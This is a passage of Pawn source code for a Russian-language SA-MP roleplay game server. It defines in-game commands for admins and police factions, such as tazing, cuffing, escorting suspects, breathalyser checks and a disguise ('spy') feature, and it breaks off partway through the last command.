	format(YCMDstr,sizeof(YCMDstr), " Показал своё удостоверение %s'у",Name(params[0]));
	SetPlayerChatBubble(playerid,YCMDstr,COLOR_PURPLE,30.0,10000);
	return true;
}
CMD:gzcolor(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid,-1, " Введите: /gzcolor [банда]");
	for(new i = 1; i <= TOTALGZ; i++)
	{
		if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
		{
			GZInfo[i][gFrakVlad] = params[0];
			GangZoneStopFlashForAll(GZInfo[i][gZone]);
			GangZoneHideForAll(GZInfo[i][gZone]);
			GangZoneShowForAll(GZInfo[i][gZone],GetGangZoneColor(i));
			UpdateTable(TABLE_GANGZONE,"gang_owner",GZInfo[i][gFrakVlad],"id",GZInfo[i][gID]);
			return true;
		}
	}
	return true;
}
CMD:tazerall(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] != 2 || PlayerInfo[playerid][pMember] == 2 && PlayerInfo[playerid][pRank] < 3) return true;
	params[0] = GetClosestforeach(playerid);
	if(!ProxDetectorS(6.0, playerid, params[0])) return SCM(playerid, COLOR_GREY, " Нет никого рядом");
	if(IsPlayerInAnyVehicle(playerid)) return  SCM(playerid, COLOR_GREY, " Невозможно использовать в машине");
	format(YCMDstr, sizeof(YCMDstr), " Агент FBI %s оглушил всех на 15 секунд",Name(playerid));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	TogglePlayerControllable(params[0], 0);
	SetPlayerSpecialAction(params[0],SPECIAL_ACTION_HANDSUP);
	PlayerCuffed[params[0]] = 1;
	PlayerCuffedTime[params[0]] = 15;
	return true;
}
CMD:atazer(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid,-1," Введите: /atazer [1/2/3]");
	if(params[0] == 1)
	{
		format(YCMDstr, sizeof(YCMDstr), " %s оглушил всех",Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				TogglePlayerControllable(i,0);
				SCM(i,-1," Вы заморожены на 10 секунд");
				SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
				SetTimerEx("UnFreeze", 10000, 0, "i", i);
			}
		}
	}
	else if(params[0] == 2)
	{
		format(YCMDstr, sizeof(YCMDstr), " %s оглушил всех рядомстоящих законников",Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				if(PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pLeader] == 1 ||PlayerInfo[i][pMember] == 2 || PlayerInfo[i][pLeader] == 2 ||PlayerInfo[i][pMember] == 3 || PlayerInfo[i][pLeader] == 3)
				{
					TogglePlayerControllable(i,0);
					SCM(i,-1," Вы заморожены на 10 секунд");
					SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
					SetTimerEx("UnFreeze", 10000, 0, "i", i);
				}
			}
		}
	}
	else if(params[0] == 3)
	{
		format(YCMDstr, sizeof(YCMDstr), " %s оглушил всех рядомстоящих жителей", Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				TogglePlayerControllable(i,0);
				SCM(i,-1," Вы заморожены на 10 секунд");
				SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
				SetTimerEx("UnFreeze", 10000, 0, "i", i);
			}
		}
	}
	else return SCM(playerid,COLOR_GREY," Неверное число");
	return true;
}
CMD:ftazer(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] != 2 && PlayerInfo[playerid][pLeader] != 2) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid,-1," Введите: /ftazer [1/2/3]");
	if(params[0] == 1)
	{
		format(YCMDstr, sizeof(YCMDstr), " Агент FBI %s оглушил всех",Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				TogglePlayerControllable(i,0);
				SCM(i,-1," Вы заморожены на 10 секунд");
				SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
				SetTimerEx("UnFreeze", 10000, 0, "i", i);
			}
		}
	}
	else if(params[0] == 2)
	{
		format(YCMDstr, sizeof(YCMDstr), " Агент FBI %s оглушил всех рядомстоящих законников",Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				if(PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pLeader] == 1 ||PlayerInfo[i][pMember] == 2 || PlayerInfo[i][pLeader] == 2 ||PlayerInfo[i][pMember] == 3 || PlayerInfo[i][pLeader] == 3)
				{
					TogglePlayerControllable(i,0);
					SCM(i,-1," Вы заморожены на 10 секунд");
					SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
					SetTimerEx("UnFreeze", 10000, 0, "i", i);
				}
			}
		}
	}
	else if(params[0] == 3)
	{
		format(YCMDstr, sizeof(YCMDstr), " Агент FBI %s оглушил всех рядомстоящих жителей", Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				TogglePlayerControllable(i,0);
				SCM(i,-1," Вы заморожены на 10 секунд");
				SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
				SetTimerEx("UnFreeze", 10000, 0, "i", i);
			}
		}
	}
	else return SCM(playerid,COLOR_GREY," Неверное число");
	return true;
}
CMD:tazer(playerid, params[])
{
	if(IsACop(playerid) && GetPVarInt(playerid, "Fraction_Duty"))
	{
	    if(NewTazer[playerid] == false)
	    {
			NewTazer[playerid] = true;
			SCM(playerid,COLOR_BLUE," Вы поменяли пули на резиновые");
			SCM(playerid,COLOR_BLUE," Для быстрой смены пуль, зажмите клавижу ПРОБЕЛ");
		}
		else
		{
			NewTazer[playerid] = false;
			SCM(playerid,COLOR_BLUE," Вы поменяли пули на обычные");
			SCM(playerid,COLOR_BLUE," Для быстрой смены пуль, зажмите клавижу ПРОБЕЛ");
		}
	} else return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
	return true;
}
CMD:itazer(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] != 11 && !GetPVarInt(playerid,"Fraction_Duty")) return SCM(playerid,COLOR_GREY," Вам не доступна данная команда");
	else if(PlayerInfo[playerid][pLeader] != 11) return SCM(playerid,COLOR_GREY," Вам не доступна данная команда");
	if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_GREY, " Невозможно использовать в машине");
	new suspect = GetClosestforeach(playerid);
	if(PlayerCuffed[suspect] > 0) return SCM(playerid, COLOR_GREY, " Игрок уже в наручниках!");
	if(GetDistanceBetweenPlayers(playerid,suspect) < 5)
	{
		if(IsACop(suspect)) return SCM(playerid, COLOR_GREY, " Вы не можете ударить тазером законника");
		if(IsPlayerInAnyVehicle(suspect)) return SCM(playerid, COLOR_GREY, " Человек в машине!");
		format(YCMDstr, sizeof(YCMDstr), " Вас обездвижил электрошокером %s на 15 секунд",Name(playerid));
		SCM(suspect, 0x6495EDFF, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " Вы обездвижили электрошокером %s на 15 секунд",Name(suspect));
		SCM(playerid, 0x6495EDFF, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " Инуструктор %s обезвредил %s", Name(playerid) ,Name(suspect));
		ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		TogglePlayerControllable(suspect, 0);
		SetPlayerSpecialAction(suspect,SPECIAL_ACTION_HANDSUP);
		PlayerCuffed[suspect] = 1;
		PlayerCuffedTime[suspect] = 15;
	}
	return true;
}
CMD:breathalyser(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(PlayerInfo[playerid][pMember] != 1 || PlayerInfo[playerid][pLeader] != 1) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: (/bh) /breathalyser [ид]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн");
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid, COLOR_GREY, " Необходимо находиться рядом друг с другом");
	new bh[64], patrol[144];
	if(GetPlayerDrunkLevel(params[0]) > 0) format(bh, sizeof(bh), " %s пьяный", PlayerInfo[params[0]][pName]);
	else format(bh, sizeof(bh), " %s трезвый", PlayerInfo[params[0]][pName]);
	SCM(playerid, 0x6ab1ffaa, bh), SCM(params[0], 0x6ab1ffaa, bh);
	format(patrol, sizeof(patrol), " Патрульный %s протянул(а) %s алкометр для проверки", PlayerInfo[playerid][pName], PlayerInfo[params[0]][pName]);
	ProxDetector(30.0, playerid, patrol, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return true;
}
CMD:follow(playerid,params[])
{
	if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 21)
	{
		if(sscanf(params,"d",params[0])) return SCM(playerid,-1, " Введите: /follow [playerid]");
		if(playerid == params[0]) return SCM(playerid, COLOR_GREY, " Нельзя использовать на себе");
		if(!ProxDetectorS(3.0,playerid,params[0]) || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(params[0])) return SCM(playerid,COLOR_GREY, " Необходимо находится рядом друг с другом");
		if(IsPlayerInAnyVehicle(params[0])) return SCM(playerid, COLOR_GREY, " Игрок не должен находиться в автомобиле");
		if(PlayerCuffed[params[0]] != 2) return SCM(playerid, COLOR_GREY, " Игрок должен быть в наручниках");
		new konv = GetPVarInt(playerid, "TempConvoi");
		if(params[0] == konv)
		{
			SetPVarInt(playerid, "TempConvoi", -1);
			Convoi[params[0]] = 9999;
			KillTimer(TimerForPlayer[params[0]]);
			TimerForPlayer[params[0]] = INVALID_PLAYER_ID;
			ClearAnimations(playerid);
			TogglePlayerControllable(params[0], 0);
			return 	GameTextForPlayer(params[0],"~g~unfollow", 5000, 3);
		}
		if(konv != -1) return SCM(playerid, COLOR_GREY, " Вы уже кого-то сопровождаете");
		Convoi[params[0]] = playerid;
		SetPVarInt(playerid, "TempConvoi", params[0]);
		TimerForPlayer[params[0]] = SetTimerEx("ConvoiToPlayer", 250, 1, "i", params[0]);
		GameTextForPlayer(params[0],"~r~follow", 5000, 3);
    }
    return true;
}
CMD:cuff(playerid, params[])
{
	if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 21)
	{
		if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /cuff [playerid]");
		if(!IsPlayerConnected(params[0])) return true;
		if(PlayerInfo[params[0]][pWantedLevel] < 1) return SCM(playerid, COLOR_GREY, " Игрок не находится в розыске");
		if(IsACop(params[0]) && GetPVarInt(params[0], "Fraction_Duty")) return SCM(playerid, COLOR_GREY, " Вы не можете надеть наручники на законника");
		if(PlayerCuffed[params[0]] == 2) return    SCM(playerid, COLOR_GREY, " Игрок уже в наручниках");
		if(!ProxDetectorS(8.0, playerid, params[0])) return true;
		if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " Нельзя надеть на себя наручники"); return true; }
		format(YCMDstr, sizeof(YCMDstr), " %s надел вам наручники",Name(playerid));
		SCM(params[0], 0x6495EDFF, YCMDstr);
		GameTextForPlayer(params[0],"~r~cuffed", 5000, 3);
		format(YCMDstr, sizeof(YCMDstr), " Вы надели наручники на %s", Name(params[0]));
		SCM(playerid, 0x6495EDFF, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " %s надел наручники %s",Name(playerid),Name(params[0]));
		SetPlayerAttachedObject(params[0], 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
		SetPlayerSpecialAction(params[0],SPECIAL_ACTION_CUFFED);
		ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		TogglePlayerControllable(params[0], 0);
		PlayerCuffed[params[0]] = 2;
		PlayerCuffedTime[params[0]] = 3600;
		cuffto[playerid] = params[0];
	}
	return true;
}
CMD:uncuff(playerid, params[])
{
	if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 21)
	{
		if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /uncuff [playerid]");
		if(!IsPlayerConnected(params[0])) return true;
		if(IsACop(params[0]) && GetPVarInt(params[0], "Fraction_Duty")) return SCM(playerid, COLOR_GREY, " Вы не можете снять наручники с законника");
		if(PlayerCuffed[params[0]] != 2) return    SCM(playerid, COLOR_GREY, " Игрок не в наручниках");
		if(!ProxDetectorS(8.0, playerid, params[0])) return true;
		if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " Вы не можете снять наручники с самого себя"); return true; }
		GameTextForPlayer(params[0],"~g~uncuffed", 5000, 3);
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли наручники с %s", Name(params[0]));
		SCM(playerid, 0x6495EDFF, YCMDstr);
		TogglePlayerControllable(params[0], 1);
		SetPlayerSpecialAction(params[0],SPECIAL_ACTION_NONE);
		RemovePlayerAttachedObject(params[0],0);
		PlayerCuffed[params[0]] = 0;
		PlayerCuffedTime[params[0]] = 0;
		cuffto[playerid] = 9999;
	}
	return true;
}
CMD:cput(playerid, params[])
{
	if(PlayerInfo[playerid][pRank] >= 1 && (PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 10 ||PlayerInfo[playerid][pMember] == 21))
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 596 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 490 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 597 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 598) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Вы не в патрульной машине");
		if(sscanf(params, "u",params[0])) return  SCM(playerid, -1, " Введите: /cput [playerid]");
		if(!IsPlayerConnected(params[0])) return true;
		if(params[0] == INVALID_PLAYER_ID) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек небыл найден");
		if (!ProxDetectorS(5.0, playerid, params[0])) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек далеко от вас");
		if(params[0] == playerid) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Вы не можете затащить в машину самого себя");
		if(!PlayerInfo[params[0]][pWantedLevel]) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек не является преступником");
		if(GetPlayerState(params[0]) != PLAYER_STATE_ONFOOT) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек в автомобиле");
		new mesto2,vehicle=GetPlayerVehicleID(playerid);
		foreach(i)
		{
			if(IsPlayerInVehicle(i,vehicle))
			{
				mesto2 = GetPlayerVehicleSeat(i);
				if(mesto2==2) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Место в машине уже занято");
			}
		}
		PutPlayerInVehicleEx(params[0],vehicle,1);
		SetPlayerArmedWeapon(params[0],0);
		format(YCMDstr,sizeof(YCMDstr), "Вы были затащены в машину офицером / агентом FBI %s",Name(playerid));
		SCM(params[0],0x64E96EDFF,YCMDstr);
		format(YCMDstr,sizeof(YCMDstr), "Вы затащили в машину преступника %s",Name(params[0]));
		SCM(playerid,0x64E96EDFF,YCMDstr);
	}
	return true;
}
CMD:ceject(playerid, params[])
{
	if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 21)
	{
		new giveplayerid,sendername[MAX_PLAYER_NAME],giveplayer[MAX_PLAYER_NAME];
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 596 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 597 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 598 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 490) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Вы не в патрульной машине");
		if(sscanf(params, "u",giveplayerid)) return  SCM(playerid, -1, " Введите: /ceject [playerid]");
		if(!IsPlayerConnected(giveplayerid)) return true;
		if(giveplayerid == INVALID_PLAYER_ID) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек не был найден");
		if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(giveplayerid)) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек не в вашей машине");
		RemovePlayerFromVehicle(giveplayerid);
		GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(IsPlayerInRangeOfPoint(giveplayerid,5.0,1568.6144,-1689.9901,6.2188))
		{
			SetPlayerInterior(giveplayerid,6);
			SetPlayerPos(giveplayerid,268.4186,77.6443,1001.0391);
			SetPlayerFacingAngle(giveplayerid, 85.7670);
			format(string,128, " Вы были высажены с машины офицером %s в участок Лос Сантоса",sendername);
			SCM(giveplayerid,0x64E96EDFF,string);
			format(string,128, " Вы высадили подозреваемого %s в полицейский участок Лос Сантоса",giveplayer);
			SCM(playerid,0x64E96EDFF,string);
			format(string,128, " Затолкал(а) подозреваемого %s в полицейский участок",giveplayer);
			SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
		}
		else if(IsPlayerInRangeOfPoint(giveplayerid,5.0,-1594.2096,716.1803,-4.9063))
		{
			SetPlayerInterior(giveplayerid,10);
			SetPlayerPos(giveplayerid,220.1259,114.6476,999.0156);
			SetPlayerFacingAngle(giveplayerid, 95.3400);
			format(string,128, " Вы были высажены с машины офицером %s в участок Сан Фиеро",sendername);
			SCM(giveplayerid,0x64E96EDFF,string);
			format(string,128, " Вы высадили подозреваемого %s в полицейский участок Сан Фиерро",giveplayer);
			SCM(playerid,0x64E96EDFF,string);
			format(string,128, " Затолкал(а) подозреваемого %s в полицейский участок",giveplayer);
			SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
		}
		else if(IsPlayerInRangeOfPoint(giveplayerid,5.0,2297.1138,2451.4346,10.8203))
		{
			SetPlayerInterior(giveplayerid,3);
			SetPlayerVirtualWorld(giveplayerid, 122);
			SetPlayerPos(giveplayerid,198.1339,158.4835,1003.0234);
			SetPlayerFacingAngle(giveplayerid, 354.8164);
			format(string,128, " Вы были высажены с машины офицером %s в участок Лас Вентурас",sendername);
			SCM(giveplayerid,0x64E96EDFF,string);
			format(string,128, " Вы высадили подозреваемого %s в полицейский участок Лас Вентурас",giveplayer);
			SCM(playerid,0x64E96EDFF,string);
			format(string,128, " Затолкал(а) подозреваемого %s в полицейский участок",giveplayer);
			SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
		}
		else
		{
			format(string,128, " Вы были высажены с машины офицером/агентом ФБР %s",sendername);
			SCM(giveplayerid,0x64E96EDFF,string);
			format(string,128, " Вы вытащили с машины подозреваемого %s",giveplayer);
			SCM(playerid,0x64E96EDFF,string);
			format(string,128, " Вытащил(а) из машины подозреваемого %s",giveplayer);
			SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
		}
	}
	return true;
}
CMD:find(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] != 2)return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /find [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " [Ошибка] Вы указали свой ID");
	if(CallInfo[params[0]][callused] == 0 || PhoneOnline[params[0]] > 0) return SCM(playerid,COLOR_GREY," Не удается сойдениться!");
	if(PlayerInfo[params[0]][pWantedLevel] < 1) return SCM(playerid, COLOR_GREY, " Этот человек не в розыске!");
	{
		SetPlayerCheckpoint(playerid, CallInfo[params[0]][callx],CallInfo[params[0]][cally],CallInfo[params[0]][callz], 6);
		CP[playerid] = 777;
	}
	return true;
}
CMD:spy(playerid, params[])
{
	new act[4], fracid,skinid;
	new SmenaSkina;
	if(sscanf(params, "u", SmenaSkina)) return SCM(playerid, -1, " Введите: /spy [ид игрока] {AFAFAF}[on|off] [fractionid] [skinid]");
	if(sscanf(params, "us[4]", SmenaSkina,act))
	{
        SetPVarInt(playerid, "SmenaSkina", SmenaSkina);
		ShowPlayerDialogEx(playerid, 50, DIALOG_STYLE_LIST, "Меню", "[0] Гражданиский\n[1] Полиция\n[2] Армия\n[3] МЧС\n[4] Мэрия\n[5] Автошкола\n[6] News\n[7] LCN\n[8] Yakuza\n[9] Russian Mafia\n[10] Rifa\n[11] Grove street\n[12] Ballas\n[13] Vagos\n[14] Aztec\n[15] Байкеры", "Выбрать", "Назад");
		return true;
    }
    if(sscanf(params, "us[4]d", SmenaSkina, act,fracid))
    {
		if(!strcmp(act, "on", true))
	    {
	        return SCM(playerid, -1, " Введите: /spy [ид игрока] {AFAFAF}[on|off] [fractionid] [skinid]");
	    }
	    else if(!strcmp(act, "off", true))
	    {
	        if(PlayerInfo[playerid][pMember] != 2) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
	        if(PlayerInfo[playerid][pRank] < 4) return SCM(playerid, COLOR_GREY, " Доступно с 4 ранга");
	        new bool:label=false;
		 	for(new i = 0; i < 5; i++)
			{
				if(spys[i][0] == SmenaSkina)
				{
					label = true;
					spys[i][0] = -1;
					spys[i][1] = -1;
					break;
				}
			}
			if(!label) return SCM(playerid, COLOR_GREY, " Этот человек не шпион!");
	        format(YCMDstr, 80, " %s забрал у %s возможность шпионить", PlayerInfo[playerid][pName], PlayerInfo[SmenaSkina][pName]);
			SendFamilyMessage(2, 0x00b953ff, YCMDstr);
			SetPlayerSkin(SmenaSkina, PlayerInfo[SmenaSkina][pModel]);
			SetPlayerToTeamColor(SmenaSkina);
			return true;
	    }
    }
	if(sscanf(params, "us[4]dd",SmenaSkina, act,fracid,skinid))
	{
        if(!strcmp(act, "off", true))
	    {
	        format(string, sizeof(string), "/spy %i off", SmenaSkina);
	        CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			return true;
	    }
	    if(strcmp(act, "on", true) != 0)
	    {
	        return true;
	    }
	    SetPVarInt(playerid, "SmenaSkina", SmenaSkina);
        switch(fracid)
        {
            case 0: ShowPlayerDialogEx(playerid, 50+1, DIALOG_STYLE_LIST, "Меню", "[0] [skin:79]\n[1] [skin:78]\n[2] [skin:137]\n[3] [skin:200]\n[4] [skin:230]\n[5] [skin:239]\n[6] [skin:212]\n[7] [skin:228]\n[8] [skin:142]\n[9] [skin:297]\n[10] [skin:292]\n[11] [skin:122]\n[12] [skin:193]\n[13] [skin:55]\n[14] [skin:90]\n[15] [skin:40]\n[16] [skin:233]\n[17] [skin:298]\n[18] [skin:93]", "Выбрать", "Назад");
            case 1: ShowPlayerDialogEx(playerid, 50+2, DIALOG_STYLE_LIST, "Меню", "[0] [skin:280]\n[1] [skin:281]\n[2] [skin:282]\n[3] [skin:283]\n[4] [skin:288]\n[5] [skin:284]\n[6] [skin:285]\n[7] [skin:76]\n[8] [skin:306]\n[9] [skin:307]\n[10] [skin:309]\n[11] [skin:265]\n[12] [skin:266]\n[13] [skin:267]\n[14] [skin:310]\n[15] [skin:311]\n[16] [skin:302]\n[17] [skin:303]\n[18] [skin:304]\n[19] [skin:305]", "Выбрать", "Назад");
            case 2: ShowPlayerDialogEx(playerid, 50+3, DIALOG_STYLE_LIST, "Меню", "[0] [skin:287]\n[1] [skin:191]\n[2] [skin:179]", "Выбрать", "Назад");
            case 3: ShowPlayerDialogEx(playerid, 50+4, DIALOG_STYLE_LIST, "Меню", "[0] [skin:274]\n[1] [skin:275]\n[2] [skin:276]\n[3] [skin:70]\n[4] [skin:219]\n[5] [skin:308]", "Выбрать", "Назад");
            case 4: ShowPlayerDialogEx(playerid, 50+5, DIALOG_STYLE_LIST, "Меню", "[0] [skin:57]\n[1] [skin:98]\n[2] [skin:147]\n[3] [skin:187]\n[4] [skin:216]", "Выбрать", "Назад");
            case 5: ShowPlayerDialogEx(playerid, 50+6, DIALOG_STYLE_LIST, "Меню", "[0] [skin:59]\n[1] [skin:240]\n[2] [skin:150]", "Выбрать", "Назад");
            case 6: ShowPlayerDialogEx(playerid, 50+7, DIALOG_STYLE_LIST, "Меню", "[0] [skin:188]\n[1] [skin:217]\n[2] [skin:250]\n[3] [skin:261]\n[4] [skin:148]\n[5] [skin:211]", "Выбрать", "Назад");
            case 7: ShowPlayerDialogEx(playerid, 50+8, DIALOG_STYLE_LIST, "Меню", "[0] [skin:124]\n[1] [skin:223]\n[2] [skin:113]\n[3] [skin:91]", "Выбрать", "Назад");
            case 8: ShowPlayerDialogEx(playerid, 50+9, DIALOG_STYLE_LIST, "Меню", "[0] [skin:123]\n[1] [skin:186]\n[2] [skin:120]\n[3] [skin:169]\n[4] [skin:117]\n[5] [skin:118]", "Выбрать", "Назад");
            case 9: ShowPlayerDialogEx(playerid, 50+10, DIALOG_STYLE_LIST, "Меню", "[0] [skin:272]\n[1] [skin:112]\n[2] [skin:125]\n[3] [skin:214]\n[4] [skin:111]", "Выбрать", "Назад");
            case 10: ShowPlayerDialogEx(playerid, 50+11, DIALOG_STYLE_LIST, "Меню", "[0] [skin:175]\n[1] [skin:174]\n[2] [skin:173]\n[3] [skin:226]", "Выбрать", "Назад");
            case 11: ShowPlayerDialogEx(playerid, 50+12, DIALOG_STYLE_LIST, "Меню", "[0] [skin:105]\n[1] [skin:106]\n[2] [skin:107]\n[3] [skin:269]\n[4] [skin:271]\n[5] [skin:270]\n[6] [skin:56]", "Выбрать", "Назад");
            case 12: ShowPlayerDialogEx(playerid, 50+13, DIALOG_STYLE_LIST, "Меню", "[0] [skin:102]\n[1] [skin:103]\n[2] [skin:104]\n[3] [skin:195]", "Выбрать", "Назад");
            case 13: ShowPlayerDialogEx(playerid, 50+17, DIALOG_STYLE_LIST, "Меню", "[0] [skin:108]\n[1] [skin:109]\n[2] [skin:110]\n[3] [skin:190]", "Выбрать", "Назад");
            case 14: ShowPlayerDialogEx(playerid, 50+15, DIALOG_STYLE_LIST, "Меню", "[0] [skin:114]\n[1] [skin:116]\n[2] [skin:115]\n[3] [skin:41]", "Выбрать", "Назад");
            case 15: ShowPlayerDialogEx(playerid, 50+16, DIALOG_STYLE_LIST, "Меню", "[0] [skin:100]\n[1] [skin:247]\n[2] [skin:248]\n[3] [skin:254]\n[4] [skin:246]\n[5] [skin:64]\n[6] [skin:131]\n[7] [skin:198]\n[8] [skin:181]", "Выбрать", "Назад");
		}
		return true;
    }
    if(!strcmp(act, "off", true))
    {
        format(string, sizeof(string), "/spy %i off", SmenaSkina);
        CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
		return true;
    }
    if(strcmp(act, "on", true) != 0)
    {
        return true;
    }
